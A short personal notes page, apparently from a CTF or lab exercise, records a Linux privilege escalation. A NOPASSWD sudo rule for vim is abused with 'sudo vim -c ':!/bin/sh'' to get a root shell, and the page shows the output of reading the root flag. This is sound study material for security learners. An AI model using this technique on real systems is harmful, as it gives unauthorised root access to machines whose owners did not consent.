---
title: "Privilege Esc via Sudo Misconfiguration (Vim Abuse)"
aliases:
  - "Privilege Esc via Sudo Misconfiguration (Vim Abuse"
kind: topic
tags:
  - local-privilege-escaltion
area: "Local Privilege Escaltion"
up: "[[Local Privilege Escaltion]]"
notion-id: 38c759b927518043a716fa9ec665cb10
---

# Privilege Esc via Sudo Misconfiguration (Vim Abuse)

In: [[Career]] / [[Local Privilege Escaltion]]

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

```bash
 sudo vim -c ':!/bin/sh'
```

```bash
# ls /root
root.txt
# ls
LinEnum.sh  user.txt
# cat /root/root.txt
W3ll d0n3. You made it!
```
